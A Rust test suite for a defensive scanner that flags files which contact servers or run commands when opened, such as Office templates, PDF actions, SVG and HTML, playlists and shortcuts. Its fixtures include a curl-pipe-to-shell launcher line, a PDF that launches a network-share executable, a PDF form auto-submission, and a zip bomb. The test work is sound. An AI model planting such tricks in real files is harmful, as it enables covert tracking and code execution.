use super::*;
use crate::samples;

fn check(name: &str, data: &[u8]) -> Report {
    inspect_bytes(name, data, &Limits::default())
}

fn says(r: &Report, what: &str) -> bool {
    r.findings.iter().any(|f| f.what.contains(what))
}

#[test]
fn office_remote_template_and_picture_are_found_hyperlinks_are_not() {
    let r = check("plans.docx", &samples::docx(true));
    assert_eq!(r.kind, Kind::Office);
    assert!(says(&r, "template"), "{r:?}");
    assert!(r.findings.iter().any(|f| f.target.as_deref() == Some(samples::EVIL)));
    assert!(says(&r, "picture"));
    assert!(!r.findings.iter().any(|f| f.target.as_deref() == Some("https://example.org/click")), "a link needs a click");
    assert_eq!(r.title(), "This file tries to contact a server when opened.");
    // the same document with a local template: nothing
    let r = check("plans.docx", &samples::docx(false));
    assert!(!r.found(), "{r:?}");
}

#[test]
fn a_split_field_code_is_found() {
    let r = check("x.docx", &samples::docx_field());
    assert!(r.findings.iter().any(|f| f.target.as_deref() == Some("http://img.example.com/a.png")), "{r:?}");
}

#[test]
fn opendocument_linked_picture_is_found() {
    let r = check("a.odt", &samples::odt(true));
    assert_eq!(r.kind, Kind::OpenDocument);
    assert!(says(&r, "picture"), "{r:?}");
    assert!(!check("a.odt", &samples::odt(false)).found());
}

#[test]
fn pdf_open_action_is_found_and_a_link_is_not() {
    let r = check("a.pdf", &samples::pdf(true));
    assert!(says(&r, "opens a web address by itself"), "{r:?}");
    assert!(r.findings.iter().any(|f| f.target.as_deref() == Some("https://tracker.example.net/opened?id=1")));
    let r = check("a.pdf", &samples::pdf(false));
    assert!(!r.found(), "a clickable link only: {r:?}");
}

#[test]
fn pdf_tricks_are_seen_through() {
    // the name written with #xx escapes, the action inline, chained with /Next, behind a page's /AA
    let p = samples::pdf_from(
        &[
            "<< /Type /Catalog /Pages 2 0 R >>",
            "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            "<< /Type /Page /Parent 2 0 R /AA << /O << /S /GoTo /D [3 0 R /Fit] /Next 4 0 R >> >> >>",
            "<< /S /Submit#46orm /F << /FS /URL /F (https://collect.example.net/f) >> >>",
        ],
        "",
    );
    let r = check("a.pdf", &p);
    assert!(says(&r, "sends its form"), "{r:?}");
    // JavaScript anywhere, and Launch
    let p = samples::pdf_from(
        &["<< /Type /Catalog /Names << /JavaScript 2 0 R >> >>", "<< /Names [(a) << /S /JavaScript /JS (app.alert(1)) >>] >>"],
        "",
    );
    assert!(says(&check("a.pdf", &p), "JavaScript"));
    let p = samples::pdf_from(&["<< /Type /Catalog /OpenAction << /S /Launch /F (\\\\\\\\server\\\\share\\\\x.exe) >> >>"], "");
    let r = check("a.pdf", &p);
    assert!(says(&r, "starts a program"), "{r:?}");
    assert!(r.findings[0].sure, "a program on a network share");
    // an /OpenAction that only shows a page
    let p = samples::pdf_from(
        &[
            "<< /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /Fit] >>",
            "<< /Type /Pages /Kids [3 0 R] >>",
            "<< /Type /Page /Annots [<< /A << /S /URI /URI (http://x.example/) >> >>] >>",
        ],
        "",
    );
    assert!(!check("a.pdf", &p).found());
}

#[test]
fn svg_and_html_outside_resources_are_found() {
    let svg = br#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="https://img.example.com/t.png"/><a xlink:href="https://example.org"><text>x</text></a><style>@font-face{src:url(https://fonts.example.com/f.woff)}</style></svg>"#;
    let r = check("pic.svg", svg);
    assert_eq!(r.kind, Kind::Svg);
    assert!(says(&r, "picture") && says(&r, "style or font"), "{r:?}");
    assert!(!r.findings.iter().any(|f| f.target.as_deref() == Some("https://example.org")));
    let scripted = br#"<svg><script>fetch('x')</script></svg>"#;
    let r = check("p.svg", scripted);
    assert!(says(&r, "script") && !r.findings[0].sure);
    let html = br#"<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0; url=https://go.example.net/"><link rel=stylesheet href="//cdn.example.com/a.css"></head><body><img src="h&#116;tps://img.example.com/1.gif" srcset="a.png 1x, https://img.example.com/2x.png 2x"><a href="https://example.org">ok</a></body></html>"#;
    let r = check("page.html", html);
    assert!(says(&r, "sends you") && says(&r, "style or font") && says(&r, "picture"), "{r:?}");
    assert!(r.findings.iter().any(|f| f.target.as_deref() == Some("https://img.example.com/1.gif")), "entities decoded");
    assert!(r.findings.iter().any(|f| f.target.as_deref() == Some("https://img.example.com/2x.png")));
    let local = br#"<html><body><img src="a.png"><a href="https://example.org">x</a></body></html>"#;
    assert!(!check("page.html", local).found());
}

#[test]
fn playlists_with_remote_entries_are_found() {
    let m3u = b"#EXTM3U\n#EXTINF:1,a\nmusic/a.mp3\n#EXTINF:1,b\nhttp://radio.example.com/live\n";
    let r = check("list.m3u", m3u);
    assert!(says(&r, "plays from a server"), "{r:?}");
    let hls = b"#EXTM3U\n#EXT-X-KEY:METHOD=AES-128,URI=\"https://keys.example.com/k\"\nseg1.ts\n";
    assert!(check("a.m3u8", hls).found());
    assert!(!check("local.m3u", b"#EXTM3U\n/home/me/a.mp3\nb.flac\n").found());
    assert!(check("a.pls", b"[playlist]\nFile1=http://radio.example.com/x\nNumberOfEntries=1\n").found());
    let xspf = br#"<?xml version="1.0"?><playlist version="1" xmlns="http://xspf.org/ns/0/"><trackList><track><location>file:///a.ogg</location><image>https://art.example.com/c.jpg</image></track></trackList></playlist>"#;
    assert!(check("a.xspf", xspf).found());
    assert!(check("a.asx", br#"<ASX version="3.0"><Entry><Ref href="mms://media.example.com/x"/></Entry></ASX>"#).found());
}

#[test]
fn shortcuts_are_found() {
    let r = check("free.desktop", b"[Desktop Entry]\nType=Link\nURL=https://example.net/x\nName=Free\n");
    assert!(says(&r, "shortcut"), "{r:?}");
    let r = check("free.desktop", b"[Desktop Entry]\nType=Application\nExec=sh -c 'curl x | sh'\nName=Free\n");
    assert!(says(&r, "runs a command") && !r.findings[0].sure);
    let r = check("doc.url", b"[InternetShortcut]\r\nURL=file:///C:/x\r\nIconFile=\\\\files.example.net\\share\\i.ico\r\n");
    assert!(says(&r, "icon from a server"), "{r:?}");
    assert!(check("a.webloc", br#"<?xml version="1.0"?><plist><dict><key>URL</key><string>https://example.net/</string></dict></plist>"#)
        .found());
}

#[test]
fn files_inside_a_zip_are_checked_in_memory() {
    let mut w = crate::zip::Writer::new(Vec::new());
    w.file(b"readme.txt", b"hi", false).unwrap();
    w.file(b"invoice.docx", &samples::docx(true), false).unwrap();
    w.file(b"open me.url", b"[InternetShortcut]\nURL=https://example.net/\n", false).unwrap();
    w.file(b"inner.zip", &samples::plain_zip(), false).unwrap();
    let z = w.finish().unwrap();
    let r = check("bundle.zip", &z);
    assert_eq!(r.kind, Kind::Zip);
    let inside: Vec<&str> = r.findings.iter().filter_map(|f| f.inside.as_deref()).collect();
    assert!(inside.contains(&"invoice.docx") && inside.contains(&"open me.url"), "{r:?}");
    assert!(!inside.contains(&"readme.txt"));
}

#[test]
fn ordinary_files_are_quiet() {
    for (n, d) in [("a.txt", &b"hello"[..]), ("a.bin", b"\0\x01\x02"), ("a.jpg", &samples::jpeg()), ("a.mp3", &samples::mp3()), ("", b"")] {
        let r = check(n, d);
        assert!(!r.found(), "{n}: {r:?}");
    }
}

#[test]
fn a_zip_bomb_is_stopped_by_the_caps() {
    let mut w = crate::zip::Writer::new(Vec::new());
    let big = vec![b'<'; 32 << 20];
    w.file(b"word/document.xml", &big, false).unwrap();
    w.file(b"[Content_Types].xml", b"<Types/>", false).unwrap();
    let z = w.finish().unwrap();
    assert!(z.len() < 1 << 20, "it packs small");
    let r = check("bomb.docx", &z);
    assert!(!r.complete, "the part over the cap is not unpacked: {r:?}");
}

#[test]
fn files_on_disk_and_other_archives() {
    let d = std::env::temp_dir().join(format!("heimdall-guard-test-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    let p = d.join("report.pdf");
    std::fs::write(&p, samples::pdf(true)).unwrap();
    let before = std::fs::read(&p).unwrap();
    let r = inspect_path(&p, &Limits::default()).unwrap();
    assert!(r.found());
    assert_eq!(std::fs::read(&p).unwrap(), before, "the file is only read");
    // a tar with a launcher in it, listed by bsdtar where it is installed
    let has_bsdtar = std::env::var_os("PATH").is_some_and(|p| std::env::split_paths(&p).any(|x| x.join("bsdtar").is_file()));
    if has_bsdtar {
        let mut tar = vec![0u8; 512];
        tar[..12].copy_from_slice(b"free.desktop");
        tar[100..107].copy_from_slice(b"0000644");
        tar[124..135].copy_from_slice(b"00000000005");
        tar[136..147].copy_from_slice(b"00000000000");
        tar[156] = b'0';
        tar[257..263].copy_from_slice(b"ustar\0");
        tar[263..265].copy_from_slice(b"00");
        tar[148..156].copy_from_slice(b"        ");
        let sum: u32 = tar.iter().map(|&b| b as u32).sum();
        tar[148..155].copy_from_slice(format!("{sum:06o}\0").as_bytes());
        let mut body = b"hello".to_vec();
        body.resize(512, 0);
        tar.extend(body);
        tar.extend(vec![0u8; 1024]);
        let t = d.join("bundle.tar");
        std::fs::write(&t, &tar).unwrap();
        let r = inspect_path(&t, &Limits::default()).unwrap();
        assert_eq!(r.kind, Kind::Archive);
        assert!(r.findings.iter().any(|f| f.inside.as_deref() == Some("free.desktop")), "{r:?}");
    }
    let _ = std::fs::remove_dir_all(&d);
}
